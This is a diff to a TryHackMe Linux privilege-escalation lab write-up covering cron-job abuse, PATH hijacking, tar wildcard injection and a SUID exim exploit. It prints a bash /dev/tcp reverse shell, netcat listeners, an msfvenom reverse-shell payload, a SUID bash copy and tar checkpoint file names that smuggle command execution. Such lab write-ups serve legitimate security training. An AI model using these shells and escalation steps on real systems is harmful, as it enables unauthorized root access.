@@ -340,81 +340,173 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 
 ### Cron Jobs - File Permissions
 
+In this task we will use weak file permissions for scheduled tasks.
+
+First we look at the contents of the system-wide crontab.
+
+```cmd
 cat /etc/crontab
+```
 
 ![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)
 
+Looks like one of the tasks executes a script. We can easily locate it with `locate`.
+
+```cmd
 locate overwrite.sh
+```
+
+![Locate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png)
+
+Now that we know its location, lets look at the permissions we have for this file.
+
+```cmd
 ls -l /usr/local/bin/overwrite.sh
+```
+
+![Permission](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png)
+
+It seems like we have write access to it. How convenient. Lets open it up to edit the contents of the file.
+
+```cmd
 nano /usr/local/bin/overwrite.sh
+```
 
+Now we add the following code to the file.
 
+```cmd
 bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-
-nc -nvlp 4444
-
-
-
+```
 
 ![Job](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Job.png)
-![Locate](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Locate.png)
-![Permission](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Permission.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png)
 
+Then we start a listener on our device and wait for the task to execute a create a shell for us.
+
+```cmd
+nc -nvlp 4444
+```
+
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Root_Shell.png)
 
 ### Cron Jobs - PATH Environment Variable
 
+In this task we use the PATH variable to execute our own code.
+
+First we look at the contents of the system-wide crontab.
+
+```cmd
 cat /etc/crontab
+```
 
 ![Crontab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Permissions_Crontab.png)
 
+Looks like it looks for the scripts in `/home/user`. Lets create our own script in this folder.
+
+```cmd
 touch overwrite.sh
 nano overwrite.sh
+```
 
 ![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Create_Script.png)
 
+Now we add the following code to this file (similar to the previous task)
+
+```cmd
 #!/bin/bash
 
 cp /bin/bash /tmp/rootbash
 chmod +xs /tmp/rootbash
-
+```
 
 ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Script.png)
 
+Next, we must make sure this script is executable with `chmod`.
+
+```cmd
 chmod +x /home/user/overwrite.sh
+```
 
 ![Chmod](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Chmod.png)
 
+If executed properly, this should create an executable we can run in the `/tmp/` folder. Running the following command should give us a root shell.
+
+```cmd
 /tmp/rootbash -p
+```
 
 ![Variable](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Variable.png)
 
+Before moving on, we must remove the script.
+
+```cmd
 rm /tmp/rootbash
 exit
+```
 
 ![Remove](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_File_Path_Remove.png)
 
+1. What is the value of the PATH variable in /etc/crontab?
 
-
-/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+   ><details><summary>Click for answer</summary>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</details>
 
 ### Cron Jobs - Wildcards
 
+In this task we will utilize the fact that `tar` can be used with a wildcard to run extra commands.
+
 *Read and follow along with the above.*
 
+Lets look at the other file in the crontab.
 
-
+```cmd
+cat /usr/local/bin/compress.sh
+```
 
 ![Compress](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Compress.png)
-![Create Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Create_Files.png)
-![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Root_Shell.png)
+
+On [GTFO Bins](https://gtfobins.github.io/gtfobins/tar/) we can see which commands we can run with tar. We can use `msfvenom` to create the necessary payload.
+
+```cmd
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.78.136 LPORT=1337 -f elf -o shell.elf
+```
+
+Now we use `scp` to transfer this file to our target machine.
+
+```cmd
+scp -r -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.10.136.213:/home/user/shell.elf
+```
+
 ![Scp](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Scp.png)
 
+We must make this file executable:
 
+```cmd
+chmod +x /home/user/shell.elf
+```
 
+Next we must create two files in the user folder.
 
+```cmd
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
 
+![Create Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Create_Files.png)
 
+Now we just set up a listener on our machine a wait for the task to run.
+
+```cmd
+nc -nlvp 1337
+```
+
+![Root Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/Cron_Wild_Cards_Root_Shell.png)
+
+Lastly, we must remove the files again.
+
+```cmd
+rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf
+```
 
 ### SUID / SGID Executables - Known Exploits
 
@@ -422,34 +514,57 @@ In this task we will abuse known exploits for binaries with their SUID bit set.
 
 *Read and follow along with the above.*
 
+We use the following command to find all executables with their SUID/SGID bit set.
+
 ```cmd
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
+
+![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions.png)
+
+Another method I use myself is:
+
 ```cmd
 find / -perm -4000 2> /dev/null
 ```
+
+![Permissions 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions_2.png)
+
+Looks like there is an exploit we can use.
+
+![Exploit Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Exploit_Database.png)
+
+We can use the pre-made script from the machine.
+
 ```cmd
 s -lh tools/suid/exim
 ```
+
 ```cmd
 ./tools/suid/exim/cve-2016-1531.sh
 ```
+
+![Auto Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Auto_Root.png)
+
+However, we can also create this file ourselves from the exploit database.
+
 ```cmd
 touch cve-2016-1531.sh
 nano cve-2016-1531.sh
 ```
+
+![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Create_Script.png)
+
+![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Script.png)
+
+Make sure it is executable and then run the script.
+
 ```cmd
 chmod +x cve-2016-1531.sh
 ./cve-2016-1531.sh
 ```
 
-![Auto Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Auto_Root.png)
-![Create Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Create_Script.png)
-![Exploit Database](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Exploit_Database.png)
 ![Manual Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Root.png)
-![Manual Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Manual_Script.png)
-![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions.png)
-![Permissions 2](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linuxprivesc/SUID_Known_Exploits_Permissions_2.png)
 
 ### SUID / SGID Executables - Shared Object Injection
 ### SUID / SGID Executables - Environment Variables
